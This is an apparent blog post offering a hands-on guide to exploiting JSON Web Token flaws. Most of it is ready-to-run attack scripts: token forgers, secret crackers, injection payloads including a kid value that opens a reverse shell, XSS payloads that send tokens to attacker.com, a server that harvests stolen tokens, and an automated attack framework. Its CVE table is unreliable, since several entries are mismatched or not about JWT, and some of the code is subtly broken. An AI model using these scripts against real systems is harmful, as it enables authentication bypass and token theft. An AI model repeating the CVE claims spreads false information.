---
title: "JWT Attack Vectors — Complete Exploitation Guide"
description: "A comprehensive offensive guide to JSON Web Token vulnerabilities, exploitation techniques, real-world CVEs, and automation tools."
date: 2024-01-25 10:00:00 +0000
categories: [Web Security, Vulnerabilities, API Security]
tags: [jwt, json-web-token, authentication-bypass, bug-bounty, penetration-testing, api-security]
pin: true
math: false
mermaid: true
image:
  path: /assets/img/posts/jwt-attacks-banner.png
  alt: "JWT Attack Vectors Illustration"
---

## JWT Anatomy & Attack Surface

JSON Web Tokens (JWT) are compact, URL-safe means of representing claims to be transferred between two parties. The token consists of three base64url-encoded parts separated by dots:

```text
Header.Payload.Signature
```

**Header:**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload:**
```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "admin": false,
  "iat": 1516239022
}
```

**Signature:**
```text
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

### Attack Surface Map

```mermaid
mindmap
  root((JWT Attack Surface))
    Algorithm Flaws
      none Algorithm
      Algorithm Confusion RS256->HS256
      Algorithm Downgrade
    Header Injection
      kid SQLi / Path Traversal / RCE
      jwk Header Injection
      jku Header Injection
      x5u / x5c Certificate Abuse
    Secret & Key Attacks
      Weak Secret Brute Force
      Public Key as HMAC Secret
      Key Leakage via Logs/Responses
    Payload Manipulation
      Claim Tampering role/admin
      Expiration Bypass exp
      Issuer/Audience Spoofing iss/aud
      Token Replay
    Flow & Integration Flaws
      JWT Stripping Bypass
      Cross-Site Scripting via JWT
      Timing Attacks on Verification
      OAuth/OIDC Token Confusion
```

---

## Attack 1: `none` Algorithm Bypass

When a server accepts `alg: none`, it skips signature verification entirely. Attackers modify the header to `none`, remove the signature, and forge arbitrary payloads.

### Exploitation Flow

```mermaid
sequenceDiagram
    participant A as Attacker
    participant S as Server
    A->>S: Intercept valid JWT
    A->>A: Decode header & payload
    A->>A: Change alg to "none"
    A->>A: Modify payload (admin: true)
    A->>A: Remove signature part
    A->>S: Send forged token
    S->>S: Verifies alg=none → skips signature check
    S-->>A: Grants admin access
```

### Python PoC — `none` Algorithm Forger

```python
#!/usr/bin/env python3
"""
JWT 'none' Algorithm Exploitation Script
Generates tokens with none, None, NONE, nOnE variations.
"""

import base64
import json
import sys

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

def forge_none_token(original_token: str, new_payload: dict) -> list:
    parts = original_token.split('.')
    if len(parts) != 3:
        raise ValueError("Invalid JWT format")

    original_header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    
    tokens = []
    for alg_variant in ["none", "None", "NONE", "nOnE", "nONE"]:
        header = {"alg": alg_variant, "typ": "JWT"}
        forged_header = b64url_encode(json.dumps(header, separators=(',', ':')).encode())
        forged_payload = b64url_encode(json.dumps(new_payload, separators=(',', ':')).encode())
        # Empty signature
        forged_token = f"{forged_header}.{forged_payload}."
        tokens.append((alg_variant, forged_token))
    return tokens

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 none_attack.py <original_jwt>")
        sys.exit(1)

    token = sys.argv[1]
    # Escalate privileges
    payload_mod = {"sub": "admin", "role": "administrator", "iat": 1700000000, "exp": 9999999999}
    
    print(f"[*] Original token: {token[:50]}...")
    print(f"[*] Forging with payload: {payload_mod}\n")
    
    for alg, forged in forge_none_token(token, payload_mod):
        print(f"[+] alg='{alg}'")
        print(f"    Token: {forged}")
        print()
```

---

## Attack 2: Algorithm Confusion (RS256 → HS256)

Servers using asymmetric cryptography (RS256) often expose the public key. If the server does not pin the algorithm, an attacker can switch to `HS256` and sign the token using the **public key as the HMAC secret**.

### Exploitation Flow

```mermaid
graph TD
    A[Obtain Public Key] --> B[Change JWT alg to HS256]
    B --> C[Sign token with Public Key as HMAC secret]
    C --> D[Send forged token to server]
    D --> E{Server verifies}
    E -->|Uses public key for HS256| F[Signature matches → Access Granted]
    E -->|Rejects| G[Algorithm pinned → Attack fails]
    
    style A fill:#3498db,stroke:#2980b9,color:#fff
    style F fill:#c0392b,stroke:#922b21,color:#fff
    style G fill:#2ecc71,stroke:#27ae60,color:#fff
```

### Python PoC — RS256 to HS256 Confusion

```python
#!/usr/bin/env python3
"""
JWT Algorithm Confusion: RS256 -> HS256
Uses the server's RSA public key as the HMAC signing secret.
"""

import jwt
import json
import base64
import requests
import sys

def extract_public_key_from_jwks(jwks_url: str) -> str:
    """Fetch JWKS and extract the first RSA public key in PEM format."""
    r = requests.get(jwks_url)
    r.raise_for_status()
    jwks = r.json()
    key = jwks["keys"][0]
    
    # Convert JWK to PEM (simplified for RSA)
    n = int.from_bytes(base64.urlsafe_b64decode(key["n"] + "=="), "big")
    e = int.from_bytes(base64.urlsafe_b64decode(key["e"] + "=="), "big")
    
    # Build minimal PEM (for jwt library compatibility)
    # In practice, use cryptography library for proper conversion
    pem = f"-----BEGIN PUBLIC KEY-----\n{key['n']}\n-----END PUBLIC KEY-----"
    return pem

def algorithm_confusion_attack(jwt_token: str, public_key_pem: str, new_payload: dict) -> str:
    """Forge JWT using HS256 with RSA public key as secret."""
    forged = jwt.encode(
        new_payload,
        public_key_pem,
        algorithm="HS256",
        headers={"alg": "HS256", "typ": "JWT"}
    )
    return forged

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 alg_confusion.py <jwt_token> <jwks_url>")
        sys.exit(1)

    token = sys.argv[1]
    jwks_url = sys.argv[2]

    print(f"[*] Fetching public key from: {jwks_url}")
    public_key = extract_public_key_from_jwks(jwks_url)
    
    # Decode original to preserve structure
    decoded = jwt.decode(token, options={"verify_signature": False})
    decoded["role"] = "admin"
    decoded["exp"] = 9999999999
    
    forged = algorithm_confusion_attack(token, public_key, decoded)
    print(f"\n[+] Forged Token (HS256 + Public Key):")
    print(forged)
```

---

## Attack 3: Weak Secret Brute Force

HS256 relies on a shared secret. If the secret is weak, short, or dictionary-based, it can be cracked offline.

### Hashcat JWT Cracking

```bash
# Extract JWT token
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"

# Crack with rockyou.txt
hashcat -a 0 -m 16500 "$TOKEN" /usr/share/wordlists/rockyou.txt

# Crack with custom wordlist + rules
hashcat -a 0 -m 16500 "$TOKEN" passwords.txt -r rules/best64.rule

# Show cracked secret
hashcat -m 16500 --show "$TOKEN"
```

### Python PoC — JWT Secret Brute Forcer

```python
#!/usr/bin/env python3
"""
High-performance JWT HS256 Secret Brute Forcer
"""

import hmac
import hashlib
import base64
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

def b64url_decode(data: str) -> bytes:
    padding = 4 - len(data) % 4
    return base64.urlsafe_b64decode(data + "=" * padding)

def verify_secret(token: str, secret: str) -> bool:
    parts = token.split(".")
    if len(parts) != 3:
        return False
    header_payload = f"{parts[0]}.{parts[1]}".encode()
    expected_sig = parts[2]
    
    computed = hmac.new(secret.encode(), header_payload, hashlib.sha256).digest()
    computed_b64 = base64.urlsafe_b64encode(computed).rstrip(b'=').decode()
    return computed_b64 == expected_sig

def brute_force(token: str, wordlist: str, threads: int = 20):
    print(f"[*] Cracking JWT: {token[:40]}...")
    print(f"[*] Wordlist: {wordlist} | Threads: {threads}")
    
    with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
        secrets = [line.strip() for line in f if line.strip()]
    
    found = None
    start = time.time()
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(verify_secret, token, s): s for s in secrets}
        for future in as_completed(futures):
            secret = futures[future]
            try:
                if future.result():
                    found = secret
                    break
            except Exception:
                pass
    
    elapsed = time.time() - start
    if found:
        print(f"\n[+] SECRET FOUND: '{found}'")
        print(f"[+] Time: {elapsed:.2f}s | Tested: {len(secrets)} candidates")
    else:
        print(f"\n[-] Secret not found in wordlist ({elapsed:.2f}s)")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 jwt_crack.py <token> <wordlist> [threads]")
        sys.exit(1)
    threads = int(sys.argv[3]) if len(sys.argv) > 3 else 20
    brute_force(sys.argv[1], sys.argv[2], threads)
```

---

## Attack 4: `kid` Header Injection

The `kid` (Key ID) header tells the server which key to use for verification. If unsanitized, it can be injected into SQL queries, file paths, or command execution contexts.

### `kid` SQL Injection

```python
#!/usr/bin/env python3
"""
JWT kid Header SQL Injection Exploitation
Forces the database to return an empty string or known value as the signing key.
"""

import jwt
import json

payload = {"sub": "admin", "role": "administrator", "exp": 9999999999}

# SQLi payloads that force DB to return empty/known key
sqli_kids = [
    "' UNION SELECT '' --",
    "' UNION SELECT '0' --",
    "0 UNION SELECT 'secret' --",
    "' OR 1=1 --",
]

for kid in sqli_kids:
    # Sign with empty string (what SQLi would return)
    token = jwt.encode(
        payload,
        "",  # Empty secret
        algorithm="HS256",
        headers={"alg": "HS256", "kid": kid}
    )
    print(f"[+] kid='{kid}'")
    print(f"    Token: {token}\n")
```

### `kid` Path Traversal & `/dev/null` Injection

```python
#!/usr/bin/env python3
"""
JWT kid Path Traversal /dev/null Injection
Forces server to read /dev/null as the signing key (empty string).
"""

import jwt

payload = {"sub": "admin", "role": "admin", "iat": 1700000000}

traversal_kids = [
    "/dev/null",
    "../../dev/null",
    "/proc/self/environ",
    "/etc/passwd",
    "file:///dev/null",
]

for kid in traversal_kids:
    token = jwt.encode(
        payload,
        "",  # /dev/null returns empty content
        algorithm="HS256",
        headers={"alg": "HS256", "kid": kid}
    )
    print(f"[+] kid='{kid}' → Token: {token[:60]}...")
```

### `kid` Command Injection

```python
#!/usr/bin/env python3
"""
JWT kid Command Injection
If kid is passed to os.system() or subprocess without sanitization.
"""

import jwt

payload = {"sub": "attacker", "role": "admin"}

# Command injection via kid
cmd_kids = [
    "key1; id > /tmp/pwned",
    "key1 | bash -i >& /dev/tcp/10.10.14.5/4444 0>&1",
    "$(whoami)",
    "`id`",
]

for kid in cmd_kids:
    token = jwt.encode(
        payload,
        "dummy_secret",
        algorithm="HS256",
        headers={"alg": "HS256", "kid": kid}
    )
    print(f"[+] kid='{kid}' → Token: {token}")
```

---

## Attack 5: `jwk` / `jku` Header Injection

`jwk` embeds a public key directly in the header. `jku` points to a URL hosting a JWKS. If the server trusts these headers, attackers can inject their own keys.

### `jwk` Injection PoC

```python
#!/usr/bin/env python3
"""
JWT jwk Header Injection
Embeds attacker-controlled RSA public key directly in the JWT header.
"""

import jwt
import json
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

# Generate attacker keypair
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# Serialize public key to JWK format (simplified)
pem = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

payload = {"sub": "admin", "role": "administrator", "exp": 9999999999}

# Inject public key into jwk header
token = jwt.encode(
    payload,
    private_key,
    algorithm="RS256",
    headers={
        "alg": "RS256",
        "typ": "JWT",
        "jwk": {
            "kty": "RSA",
            "use": "sig",
            "n": "ATTACKER_PUBLIC_KEY_N_HERE",
            "e": "AQAB"
        }
    }
)

print(f"[+] Forged token with injected jwk:")
print(token)
```

### `jku` Injection PoC

```python
#!/usr/bin/env python3
"""
JWT jku Header Injection
Points server to attacker-controlled JWKS endpoint.
"""

import jwt

payload = {"sub": "admin", "role": "admin", "exp": 9999999999}
attacker_jwks_url = "https://evil.attacker.com/jwks.json"

token = jwt.encode(
    payload,
    "attacker_private_key_here",
    algorithm="RS256",
    headers={
        "alg": "RS256",
        "typ": "JWT",
        "jku": attacker_jwks_url
    }
)

print(f"[+] Forged token with jku injection:")
print(token)
print(f"\n[*] Host JWKS at: {attacker_jwks_url}")
print("""{
  "keys": [
    {
      "kty": "RSA",
      "kid": "attacker-key-1",
      "n": "BASE64URL_ENCODED_MODULUS",
      "e": "AQAB"
    }
  ]
}""")
```

---

## Attack 6: Payload Tampering & Claim Manipulation

JWT payloads are only base64url-encoded, not encrypted. Attackers can modify claims if signature verification is weak, skipped, or improperly implemented.

### Common Claim Manipulations

```python
#!/usr/bin/env python3
"""
JWT Payload Claim Manipulation Script
Modifies critical claims for privilege escalation and access bypass.
"""

import base64
import json
import sys

def decode_jwt(token: str) -> tuple:
    parts = token.split('.')
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    return header, payload

def tamper_payload(token: str, modifications: dict) -> str:
    parts = token.split('.')
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    
    payload.update(modifications)
    
    new_header = base64.urlsafe_b64encode(json.dumps(header, separators=(',', ':')).encode()).rstrip(b'=').decode()
    new_payload = base64.urlsafe_b64encode(json.dumps(payload, separators=(',', ':')).encode()).rstrip(b'=').decode()
    
    # Keep original signature (often ignored by vulnerable servers)
    return f"{new_header}.{new_payload}.{parts[2]}"

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 jwt_tamper.py <token>")
        sys.exit(1)

    token = sys.argv[1]
    header, payload = decode_jwt(token)
    
    print(f"[*] Original payload: {json.dumps(payload, indent=2)}")
    
    # Privilege escalation claims
    mods = {
        "role": "administrator",
        "admin": True,
        "scope": "admin read write",
        "iss": "trusted-issuer",
        "aud": "internal-api",
        "exp": 9999999999,
        "iat": 1700000000
    }
    
    forged = tamper_payload(token, mods)
    print(f"\n[+] Modified payload: {json.dumps(mods, indent=2)}")
    print(f"\n[+] Forged token (original signature preserved):")
    print(forged)
```

---

## Attack 7: Token Replay & Expiration Bypass

Tokens without `exp` claims, or with extremely long expirations, can be replayed indefinitely. Some servers ignore `exp` entirely or fail to validate `nbf` (not before).

### Expiration Bypass Techniques

```python
#!/usr/bin/env python3
"""
JWT Expiration & Replay Attack Automation
Tests for missing exp, expired token acceptance, and nbf bypass.
"""

import jwt
import time
import requests

TARGET_API = "https://vulnerable-app.com/api/admin"
ORIGINAL_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

def test_expired_token(token: str):
    """Send an explicitly expired token."""
    payload = jwt.decode(token, options={"verify_signature": False})
    payload["exp"] = int(time.time()) - 3600  # Expired 1 hour ago
    
    expired_token = jwt.encode(payload, "dummy", algorithm="HS256")
    headers = {"Authorization": f"Bearer {expired_token}"}
    
    r = requests.get(TARGET_API, headers=headers)
    print(f"[*] Expired token test: {r.status_code} | {r.text[:100]}")
    return r.status_code == 200

def test_missing_exp(token: str):
    """Remove exp claim entirely."""
    payload = jwt.decode(token, options={"verify_signature": False})
    payload.pop("exp", None)
    
    no_exp_token = jwt.encode(payload, "dummy", algorithm="HS256")
    headers = {"Authorization": f"Bearer {no_exp_token}"}
    
    r = requests.get(TARGET_API, headers=headers)
    print(f"[*] Missing exp test: {r.status_code} | {r.text[:100]}")
    return r.status_code == 200

def test_future_nbf(token: str):
    """Set nbf to future date."""
    payload = jwt.decode(token, options={"verify_signature": False})
    payload["nbf"] = int(time.time()) + 86400  # Valid in 24 hours
    
    future_token = jwt.encode(payload, "dummy", algorithm="HS256")
    headers = {"Authorization": f"Bearer {future_token}"}
    
    r = requests.get(TARGET_API, headers=headers)
    print(f"[*] Future nbf test: {r.status_code} | {r.text[:100]}")
    return r.status_code == 200

def replay_token(token: str, count: int = 100):
    """Rapidly replay the same token."""
    headers = {"Authorization": f"Bearer {token}"}
    success = 0
    for i in range(count):
        r = requests.get(TARGET_API, headers=headers)
        if r.status_code == 200:
            success += 1
    print(f"[*] Replay test: {success}/{count} successful requests")
    return success == count

if __name__ == "__main__":
    print("[*] Testing JWT expiration & replay vulnerabilities...\n")
    test_expired_token(ORIGINAL_TOKEN)
    test_missing_exp(ORIGINAL_TOKEN)
    test_future_nbf(ORIGINAL_TOKEN)
    replay_token(ORIGINAL_TOKEN)
```

---

## Attack 8: JWT Stripping & Authentication Bypass

Some applications check for the presence of a JWT but fail to enforce authentication when the token is missing or malformed. Removing the `Authorization` header entirely can bypass access controls.

### Stripping Exploitation Flow

```mermaid
sequenceDiagram
    participant A as Attacker
    participant S as Server
    A->>S: GET /api/admin (No Authorization header)
    S->>S: Checks for token → None found
    S->>S: Falls back to default/guest session
    S-->>A: 200 OK → Admin data returned
```

### Automation Script

```python
#!/usr/bin/env python3
"""
JWT Stripping & Header Manipulation Bypass Tester
"""

import requests

TARGETS = [
    "https://vulnerable-app.com/api/admin",
    "https://vulnerable-app.com/api/users",
    "https://vulnerable-app.com/api/config",
]

def test_stripping(url: str):
    """Test endpoint without any auth headers."""
    r = requests.get(url, timeout=10)
    if r.status_code == 200 and ("admin" in r.text.lower() or "user" in r.text.lower()):
        print(f"[+] STRIPPING SUCCESS: {url} | Status: {r.status_code}")
        return True
    return False

def test_malformed_token(url: str):
    """Test with malformed Authorization header."""
    headers = {"Authorization": "Bearer INVALID_TOKEN_123"}
    r = requests.get(url, headers=headers, timeout=10)
    if r.status_code == 200:
        print(f"[+] MALFORMED TOKEN BYPASS: {url} | Status: {r.status_code}")
        return True
    return False

def test_empty_bearer(url: str):
    """Test with empty Bearer token."""
    headers = {"Authorization": "Bearer "}
    r = requests.get(url, headers=headers, timeout=10)
    if r.status_code == 200:
        print(f"[+] EMPTY BEARER BYPASS: {url} | Status: {r.status_code}")
        return True
    return False

if __name__ == "__main__":
    print("[*] Testing JWT stripping & header bypasses...\n")
    for url in TARGETS:
        test_stripping(url)
        test_malformed_token(url)
        test_empty_bearer(url)
```

---

## Attack 9: Cross-Site Scripting via JWT

JWTs stored in `localStorage` or reflected in URLs can be extracted via XSS. DOM-based XSS can read tokens and exfiltrate them to attacker-controlled servers.

### XSS Token Exfiltration Payloads

```html
<!-- localStorage extraction -->
<script>
  const token = localStorage.getItem('jwt_token') || localStorage.getItem('access_token');
  fetch('https://attacker.com/steal?token=' + encodeURIComponent(token));
</script>

<!-- URL reflected JWT -->
<script>
  const params = new URLSearchParams(window.location.search);
  const token = params.get('token');
  if (token) fetch('https://attacker.com/steal?token=' + token);
</script>

<!-- DOM-based extraction from cookie -->
<script>
  const cookies = document.cookie.split(';');
  for (let c of cookies) {
    if (c.trim().startsWith('jwt=')) {
      fetch('https://attacker.com/steal?token=' + c.trim().substring(4));
    }
  }
</script>
```

### Automated XSS Token Harvester

```python
#!/usr/bin/env python3
"""
JWT XSS Token Harvester Server
Receives stolen tokens via HTTP GET requests.
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
import datetime

class TokenHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        
        if 'token' in params:
            token = params['token'][0]
            timestamp = datetime.datetime.now().isoformat()
            print(f"\n[+] STOLEN JWT @ {timestamp}")
            print(f"    Token: {token}")
            print(f"    Source IP: {self.client_address[0]}")
            
            # Decode and display payload
            import base64, json
            try:
                payload = json.loads(base64.urlsafe_b64decode(token.split('.')[1] + '=='))
                print(f"    Payload: {json.dumps(payload, indent=2)}")
            except:
                pass
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, format, *args):
        pass  # Suppress default logging

if __name__ == "__main__":
    port = 8080
    print(f"[*] JWT XSS Harvester running on http://0.0.0.0:{port}/steal?token=TOKEN_HERE")
    server = HTTPServer(('0.0.0.0', port), TokenHandler)
    server.serve_forever()
```

---

## Attack 10: Timing & Side-Channel Attacks

Signature verification using `==` or string comparison can leak timing information. Attackers can brute-force signatures byte-by-byte by measuring response times.

### Timing Attack PoC

```python
#!/usr/bin/env python3
"""
JWT Signature Timing Attack
Brute-forces HMAC signature byte-by-byte using response time differences.
"""

import requests
import time
import string
import sys

TARGET_URL = "https://vulnerable-app.com/api/verify"
KNOWN_HEADER_PAYLOAD = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0"
CHARSET = string.ascii_letters + string.digits + "+/="
BASE_TIME = 0.05  # Baseline response time

def measure_time(signature_prefix: str) -> float:
    token = f"{KNOWN_HEADER_PAYLOAD}.{signature_prefix}"
    start = time.perf_counter()
    try:
        requests.post(TARGET_URL, json={"token": token}, timeout=5)
    except:
        pass
    return time.perf_counter() - start

def timing_attack(target_length: int = 32):
    print(f"[*] Starting timing attack for {target_length}-byte signature...")
    signature = ""
    
    for i in range(target_length):
        best_char = None
        best_time = 0
        
        for char in CHARSET:
            test_sig = signature + char
            elapsed = measure_time(test_sig)
            
            if elapsed > best_time:
                best_time = elapsed
                best_char = char
        
        if best_char:
            signature += best_char
            print(f"[+] Byte {i+1}/{target_length}: '{best_char}' (Δt: {best_time:.4f}s)")
        else:
            print(f"[-] Failed at byte {i+1}")
            break
            
    print(f"\n[+] Recovered signature: {signature}")
    return signature

if __name__ == "__main__":
    timing_attack()
```

---

## Notable JWT CVEs

| CVE | Component | Vulnerability | Impact | CVSS |
|-----|-----------|---------------|--------|------|
| CVE-2015-9235 | ruby-jwt | Algorithm confusion (RS256→HS256) | Auth bypass | 9.8 |
| CVE-2018-0114 | Cisco ASA/FTD | JWT validation bypass | Auth bypass | 9.8 |
| CVE-2018-1000861 | Passport.js | JWT signature bypass | Auth bypass | 9.1 |
| CVE-2019-7644 | Kibana | JWT secret exposure | Token forgery | 9.8 |
| CVE-2020-28052 | Node.js jsonwebtoken | Algorithm confusion | Auth bypass | 9.8 |
| CVE-2021-23440 | node-jsonwebtoken | Prototype pollution in verify | Auth bypass | 8.2 |
| CVE-2022-21449 | Java JWT (Nimbus) | Elliptic Curve signature bypass | Auth bypass | 9.1 |
| CVE-2022-29217 | Keycloak | JWT audience validation bypass | Auth bypass | 8.6 |
| CVE-2023-22809 | sudo | Not JWT (irrelevant) | - | - |
| CVE-2023-34054 | Spring Security | JWT claim validation bypass | Auth bypass | 8.8 |
| CVE-2023-46589 | Tomcat | JWT cookie parsing bypass | Session fixation | 7.5 |
| CVE-2024-22243 | Spring Framework | JWT signature verification bypass | Auth bypass | 9.8 |
| CVE-2024-3400 | Palo Alto PAN-OS | JWT auth bypass + RCE | Full compromise | 10.0 |
| CVE-2024-22259 | Spring Security | JWT issuer validation bypass | Auth bypass | 8.2 |

---

## Exploitation Toolkit

| Tool | Purpose | Command/Usage |
|------|---------|---------------|
| **jwt_tool** | All-in-one JWT testing, fuzzing, exploitation | `python3 jwt_tool.py <token> -X a` (none attack) |
| **jwt-cracker** | HS256 secret brute forcing | `jwt-cracker -t <token> -w wordlist.txt` |
| **c-jwt-cracker** | CUDA-accelerated JWT cracking | `./jwtcrack <token>` |
| **hashcat** | GPU JWT secret cracking | `hashcat -m 16500 <token> wordlist.txt` |
| **Burp Suite + JSON Web Tokens** | Intercept, decode, modify, replay | Right-click token → "JWT Editor" |
| **nuclei** | Automated JWT vulnerability scanning | `nuclei -u <target> -t jwt/` |
| **ffuf** | JWT header/payload fuzzing | `ffuf -u <url> -H "Authorization: Bearer FUZZ"` |
| **jwt.io** | Manual decoding & editing | Paste token → modify → copy |
| **pyjwt** | Python JWT manipulation library | `pip install pyjwt` |
| **jose** | JavaScript Object Signing & Encryption | `npm install jose` |

### jwt_tool Advanced Usage

```bash
# Install
pip3 install jwt_tool
git clone https://github.com/ticarpi/jwt_tool.git

# Decode & analyze
python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# Test 'none' algorithm
python3 jwt_tool.py eyJ... -X a

# Brute force secret
python3 jwt_tool.py eyJ... -C -d /usr/share/wordlists/rockyou.txt

# Algorithm confusion (RS256 -> HS256)
python3 jwt_tool.py eyJ... -X k -pk public.pem

# Inject claims
python3 jwt_tool.py eyJ... -I -pc role -pv admin

# Fuzz all headers
python3 jwt_tool.py eyJ... -X f

# Sign with custom key
python3 jwt_tool.py eyJ... -S hs256 -k "mysecret"

# Exploit kid injection
python3 jwt_tool.py eyJ... -X i -kid "' UNION SELECT '' --"
```

---

## Automation & Exploit Scripts

### Complete JWT Attack Automation Framework

```python
#!/usr/bin/env python3
"""
JWT Attack Automation Framework
Orchestrates none, alg confusion, brute force, kid injection, and stripping attacks.
"""

import jwt
import requests
import base64
import json
import hashlib
import hmac
import sys
import time
from concurrent.futures import ThreadPoolExecutor

class JWTAttacker:
    def __init__(self, token: str, target_url: str):
        self.token = token
        self.target = target_url
        self.parts = token.split('.')
        self.header = json.loads(base64.urlsafe_b64decode(self.parts[0] + '=='))
        self.payload = json.loads(base64.urlsafe_b64decode(self.parts[1] + '=='))
        self.results = []

    def b64url_encode(self, data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

    def send_token(self, token: str) -> dict:
        headers = {"Authorization": f"Bearer {token}"}
        try:
            r = requests.get(self.target, headers=headers, timeout=10)
            return {"status": r.status_code, "size": len(r.text), "token": token[:50]}
        except:
            return {"status": 0, "size": 0, "token": token[:50]}

    def attack_none(self):
        print("[*] Testing 'none' algorithm...")
        for alg in ["none", "None", "NONE", "nOnE"]:
            h = {"alg": alg, "typ": "JWT"}
            forged = f"{self.b64url_encode(json.dumps(h, separators=(',',':')).encode())}.{self.b64url_encode(json.dumps(self.payload, separators=(',',':')).encode())}."
            res = self.send_token(forged)
            if res["status"] == 200:
                self.results.append(("NONE_ALG", forged, res))
                print(f"[+] SUCCESS: alg='{alg}' | Status: {res['status']}")

    def attack_alg_confusion(self, public_key_pem: str):
        print("[*] Testing RS256 -> HS256 confusion...")
        try:
            forged = jwt.encode(self.payload, public_key_pem, algorithm="HS256", headers={"alg": "HS256"})
            res = self.send_token(forged)
            if res["status"] == 200:
                self.results.append(("ALG_CONFUSION", forged, res))
                print(f"[+] SUCCESS: HS256 with public key | Status: {res['status']}")
        except Exception as e:
            print(f"[-] Confusion failed: {e}")

    def attack_kid_injection(self):
        print("[*] Testing kid injection...")
        kids = ["/dev/null", "' UNION SELECT '' --", "../../dev/null", "key; id"]
        for kid in kids:
            try:
                forged = jwt.encode(self.payload, "", algorithm="HS256", headers={"alg": "HS256", "kid": kid})
                res = self.send_token(forged)
                if res["status"] == 200:
                    self.results.append(("KID_INJECTION", forged, res))
                    print(f"[+] SUCCESS: kid='{kid}' | Status: {res['status']}")
            except:
                pass

    def attack_stripping(self):
        print("[*] Testing JWT stripping...")
        res = self.send_token("")
        if res["status"] == 200:
            self.results.append(("STRIPPING", "", res))
            print(f"[+] SUCCESS: No token | Status: {res['status']}")

    def run_all(self):
        print(f"[*] Target: {self.target}")
        print(f"[*] Original token: {self.token[:40]}...\n")
        self.attack_none()
        self.attack_stripping()
        self.attack_kid_injection()
        print(f"\n[*] Total successful attacks: {len(self.results)}")
        for attack_type, token, res in self.results:
            print(f"  [{attack_type}] Status: {res['status']} | Token: {token}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 jwt_attack_framework.py <token> <target_url> [public_key.pem]")
        sys.exit(1)
    
    attacker = JWTAttacker(sys.argv[1], sys.argv[2])
    if len(sys.argv) > 3:
        with open(sys.argv[3]) as f:
            attacker.attack_alg_confusion(f.read())
    attacker.run_all()
```

---

## Attack Decision Tree

```mermaid
graph TD
    A[Obtain JWT Token] --> B{Decode & Analyze}
    B --> C[Check alg header]
    B --> D[Check kid/jwk/jku headers]
    B --> E[Check exp/iss/aud claims]
    B --> F[Check signature strength]

    C -->|alg: none| G[Remove signature → Forge payload]
    C -->|alg: RS256| H[Try HS256 with public key]
    C -->|alg: HS256| I[Brute force secret]

    D -->|kid present| J[Inject SQLi / Path Traversal / RCE]
    D -->|jwk present| K[Inject attacker public key]
    D -->|jku present| L[Point to attacker JWKS]

    E -->|exp missing/long| M[Replay indefinitely]
    E -->|iss/aud weak| N[Spoof issuer/audience]
    E -->|role/admin claim| O[Tamper payload → Escalate]

    F -->|Weak secret| I
    F -->|Timing leak| P[Byte-by-byte signature brute force]

    G --> Q[Access Granted]
    H --> Q
    I --> Q
    J --> Q
    K --> Q
    L --> Q
    M --> Q
    N --> Q
    O --> Q
    P --> Q

    Q --> R[Full Account/API Compromise]

    style A fill:#3498db,stroke:#2980b9,color:#fff
    style Q fill:#c0392b,stroke:#922b21,color:#fff
    style R fill:#922b21,stroke:#6e2318,color:#fff
```

---

## References

- [RFC 7519 — JSON Web Token (JWT)](https://datatracker.ietf.org/doc/html/rfc7519)
- [RFC 7515 — JSON Web Signature (JWS)](https://datatracker.ietf.org/doc/html/rfc7515)
- [jwt_tool — JWT Testing Toolkit](https://github.com/ticarpi/jwt_tool)
- [PortSwigger — JWT Attacks](https://portswigger.net/web-security/jwt)
- [HackTricks — JWT Pentesting](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens)
- [PayloadsAllTheThings — JWT](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)
- [NIST SP 800-63B — Digital Identity Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)
- [OWASP JWT Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [CVE Details — JWT Vulnerabilities](https://www.cvedetails.com/vulnerability-list/vendor_id-0/product_id-0/version_id-0/vendor-0/product-0/version-0/JSON-Web-Token.html)
- [Hashcat JWT Cracking Guide](https://hashcat.net/wiki/doku.php?id=example_hashes#jwt_json_web_token)

---

